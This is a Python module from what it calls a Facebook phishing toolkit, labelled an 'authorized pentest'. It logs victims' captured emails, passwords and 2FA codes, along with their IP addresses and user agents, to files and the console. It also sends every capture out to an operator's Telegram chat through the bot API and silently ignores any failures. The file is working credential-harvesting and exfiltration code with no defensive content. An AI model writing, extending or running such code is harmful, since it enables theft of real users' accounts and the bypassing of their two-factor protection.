"""
Credential Logging Engine
Author : Jitu Jak
"""

import os
import json
import datetime
import threading

class CredentialLogger:
    def __init__(self, config):
        self.config = config
        self.log_dir = config['logging']['log_directory']
        self.lock = threading.Lock()
        
        os.makedirs(self.log_dir, exist_ok=True)
        
        self.log_file = os.path.join(self.log_dir, 'captured_credentials.log')
        self.compact_file = os.path.join(self.log_dir, 'captured_credentials_compact.log')
        
        # Write header
        self._write_header()
    
    def _write_header(self):
        with open(self.log_file, 'a') as f:
            f.write("=" * 80 + "\n")
            f.write(f"FACEBOOK PHISHING TOOLKIT - AUTHORIZED PENTEST\n")
            f.write(f"Author: Jitu Jak\n")
            f.write(f"Motivated to: Nancy\n")
            f.write(f"Campaign: {self.config.get('campaign_name', 'Facebook Security Audit')}\n")
            f.write(f"Started: {datetime.datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
    
    def log_credentials(self, data):
        with self.lock:
            timestamp = datetime.datetime.now().isoformat()
            
            # Full log
            with open(self.log_file, 'a') as f:
                f.write(f"\n--- CREDENTIALS CAPTURED ---\n")
                f.write(f"Timestamp: {timestamp}\n")
                f.write(f"Email: {data['email']}\n")
                f.write(f"Password: {data['password']}\n")
                f.write(f"Source IP: {data['ip']}\n")
                f.write(f"User-Agent: {data['user_agent']}\n")
                f.write("-" * 60 + "\n")
            
            # Compact log
            with open(self.compact_file, 'a') as f:
                f.write(f"[{timestamp}] [CREDENTIALS] {data['email']}:{data['password']} (IP: {data['ip']})\n")
            
            # Console output
            print(f"\n{'='*60}")
            print(f"  [!] CREDENTIALS CAPTURED!")
            print(f"  [!] Email:    {data['email']}")
            print(f"  [!] Password: {data['password']}")
            print(f"  [!] IP:       {data['ip']}")
            print(f"{'='*60}")
            
            # Telegram notification if configured
            self._send_telegram(data)
    
    def log_2fa(self, data):
        with self.lock:
            timestamp = datetime.datetime.now().isoformat()
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n--- 2FA CODE CAPTURED ---\n")
                f.write(f"Timestamp: {timestamp}\n")
                f.write(f"Email: {data['email']}\n")
                f.write(f"2FA Code: {data['code']}\n")
                f.write(f"Source IP: {data['ip']}\n")
                f.write("-" * 60 + "\n")
            
            with open(self.compact_file, 'a') as f:
                f.write(f"[{timestamp}] [2FA] {data['email']} -> Code: {data['code']} (IP: {data['ip']})\n")
            
            print(f"\n{'='*60}")
            print(f"  [!] 2FA CODE CAPTURED!")
            print(f"  [!] Email: {data['email']}")
            print(f"  [!] Code:  {data['code']}")
            print(f"  [!] IP:    {data['ip']}")
            print(f"{'='*60}")
            
            self._send_telegram(data)
    
    def _send_telegram(self, data):
        bot_token = self.config['logging'].get('telegram_bot_token')
        chat_id = self.config['logging'].get('telegram_chat_id')
        
        if bot_token and chat_id:
            try:
                import requests
                msg = f"🔴 FB Phish Capture\n\n"
                msg += f"Type: {data.get('type', 'unknown')}\n"
                msg += f"Email: {data.get('email', 'N/A')}\n"
                if 'password' in data:
                    msg += f"Password: {data['password']}\n"
                if 'code' in data:
                    msg += f"2FA Code: {data['code']}\n"
                msg += f"IP: {data.get('ip', 'N/A')}\n"
                msg += f"Time: {data.get('timestamp', 'N/A')}"
                
                requests.post(
                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
                    json={'chat_id': chat_id, 'text': msg}
                )
            except:
                pass